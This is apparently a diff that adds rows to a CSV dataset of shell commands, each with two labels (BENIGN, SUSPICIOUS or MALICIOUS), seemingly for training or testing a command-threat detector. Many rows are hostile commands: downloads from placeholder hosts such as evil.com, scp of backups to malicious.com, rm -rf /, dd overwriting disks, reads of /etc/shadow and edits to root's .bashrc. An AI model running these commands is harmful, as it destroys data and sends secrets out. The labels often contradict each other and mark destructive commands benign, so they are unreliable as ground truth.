+curl -O http://evil.com/update.bin,BENIGN,SUSPICIOUS
+cat   ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+curl -O http://suspicious.org/exploit.zip ,MALICIOUS,SUSPICIOUS
+cat /home/user/todo.txt,BENIGN,MALICIOUS
+curl -O http://fileshare.com/payload.sh,MALICIOUS,BENIGN
+echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+ssh   -l 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+wget http://suspicious.org/payload.sh,SUSPICIOUS,MALICIOUS
+echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+CURL -O   HTTP://MALICIOUS.COM/MALWARE.BIN,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,MALICIOUS
+ WATCH NETSTAT -AN,MALICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+echo 'owned' >> /etc/shadow,SUSPICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+rm -rf   /,SUSPICIOUS,BENIGN
+cat /etc/shadow,BENIGN,MALICIOUS
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+cd   /var/www,SUSPICIOUS,MALICIOUS
+cat notes.txt,SUSPICIOUS,MALICIOUS
+cat .bashrc,SUSPICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+netstat -tulnp ,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+which   python,SUSPICIOUS,BENIGN
+uname -a,BENIGN,SUSPICIOUS
+ chmod 777 /var/log/syslog,BENIGN,MALICIOUS
+ps aux | grep   sshd,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,SUSPICIOUS,MALICIOUS
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+ls /tmp/,SUSPICIOUS,MALICIOUS
+ECHO 'OWNED' >> /ETC/SHADOW,MALICIOUS,SUSPICIOUS
+ps aux,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+cat   /etc/passwd,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,BENIGN,MALICIOUS
+uname -a,SUSPICIOUS,BENIGN
+ chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,MALICIOUS
+which python,MALICIOUS,BENIGN
+scp backup.sql root@malicious.com:/root/,BENIGN,SUSPICIOUS
+wget http://suspicious.org/update.bin,MALICIOUS,BENIGN
+chmod 777 /etc/shadow ,SUSPICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+ps aux | grep sshd,BENIGN,SUSPICIOUS
+rm -rf /var/,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+SUDO SU,MALICIOUS,SUSPICIOUS
+pwd,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+cat /var/log/auth.log,BENIGN,MALICIOUS
+ECHO 'HACKED' >> /ETC/SHADOW,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+sudo apt install htop,MALICIOUS,BENIGN
+ping google.com ,SUSPICIOUS,BENIGN
+curl https://evil.com/exploit.zip ,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+scp data.tar.gz user@malicious.com:/root/,BENIGN,MALICIOUS
+sudo apt install nmap,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+iptables -F,SUSPICIOUS,MALICIOUS
+wget http://evil.com/update.bin,BENIGN,SUSPICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
+cd   /root/,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+NETSTAT -TULNP,BENIGN,SUSPICIOUS
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+cd /root/,BENIGN,SUSPICIOUS
+ cd /root,MALICIOUS,SUSPICIOUS
+whoami,BENIGN,MALICIOUS
+ifconfig,MALICIOUS,BENIGN
+grep   root /etc/passwd,SUSPICIOUS,BENIGN
+grep   'password' /etc/passwd,MALICIOUS,SUSPICIOUS
+iptables -F,SUSPICIOUS,BENIGN
+ping google.com ,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+curl -o http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
+ping google.com,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,SUSPICIOUS
+CAT   /ROOT/.BASHRC,MALICIOUS,BENIGN
+scp backup.sql admin@backup.server:/tmp/,SUSPICIOUS,BENIGN
+cat   /etc/shadow,BENIGN,MALICIOUS
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+dd   if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+echo 'pwned'   >> /etc/shadow,BENIGN,SUSPICIOUS
+cat homework.txt,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+cat   /etc/passwd,SUSPICIOUS,BENIGN
+top -n   1,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+scp backup.sql   root@backup.server:/var/www,SUSPICIOUS,BENIGN
+ CURL HTTPS://EVIL.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
+rm -rf /home/user ,SUSPICIOUS,BENIGN
+cat   .bashrc,MALICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+ps aux | grep mysql,MALICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+rm -rf /var/,BENIGN,SUSPICIOUS
+cat   /root/.bashrc,MALICIOUS,BENIGN
+dd   if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
+sudo apt   install net-tools,SUSPICIOUS,MALICIOUS
+sudo apt install net-tools,MALICIOUS,BENIGN
+cat /root/.bashrc,BENIGN,SUSPICIOUS
+ls /tmp/,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+ grep root /etc/passwd,SUSPICIOUS,MALICIOUS
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+PWD,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,BENIGN
+scp file.txt admin@malicious.com:/var/www,BENIGN,SUSPICIOUS
+ curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+echo 'hello',BENIGN,SUSPICIOUS
+env,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,MALICIOUS
+sudo   -l,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
+ps aux,SUSPICIOUS,BENIGN
+cat   welcome.txt,BENIGN,MALICIOUS
+sudo -l ,MALICIOUS,SUSPICIOUS
+curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+sudo apt install net-tools ,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,BENIGN
+df   -h,MALICIOUS,SUSPICIOUS
+CAT /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
+ps aux | grep sshd,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,MALICIOUS,SUSPICIOUS
+sudo su,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+history,BENIGN,MALICIOUS
+find / -name 'test',SUSPICIOUS,BENIGN
+find /   -name 'test',SUSPICIOUS,BENIGN
+env,MALICIOUS,SUSPICIOUS
+wget http://malicious.com/payload.sh ,SUSPICIOUS,BENIGN
+wget http://fileshare.com/update.bin ,SUSPICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+LS -AL,SUSPICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+cat   .bashrc,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+ping   google.com,MALICIOUS,SUSPICIOUS
+uname -a,SUSPICIOUS,BENIGN
+CD   /ROOT,SUSPICIOUS,BENIGN
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+CURL -O   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS,BENIGN
+CURL   HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+curl https://suspicious.org/payload.sh,SUSPICIOUS,MALICIOUS
+top -n 1,MALICIOUS,SUSPICIOUS
+env ,BENIGN,SUSPICIOUS
+cd /root/,MALICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
+SUDO APT INSTALL NMAP,BENIGN,SUSPICIOUS
+sudo apt install net-tools,MALICIOUS,SUSPICIOUS
+netstat -tulnp,MALICIOUS,SUSPICIOUS
+cat homework.txt,MALICIOUS,BENIGN
+CAT NOTES.TXT,MALICIOUS,BENIGN
+curl https://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+sudo -l ,SUSPICIOUS,BENIGN
+rm -rf   /,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash ,MALICIOUS,SUSPICIOUS
+cat /etc/shadow,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,MALICIOUS
+cd /var/www,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+ls   /tmp/,MALICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+ whoami,SUSPICIOUS,BENIGN
+SUDO   SU,SUSPICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+NETSTAT -TULNP,BENIGN,SUSPICIOUS
+sudo apt install net-tools,MALICIOUS,BENIGN
+PWD,MALICIOUS,BENIGN
+grep root   /etc/passwd,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
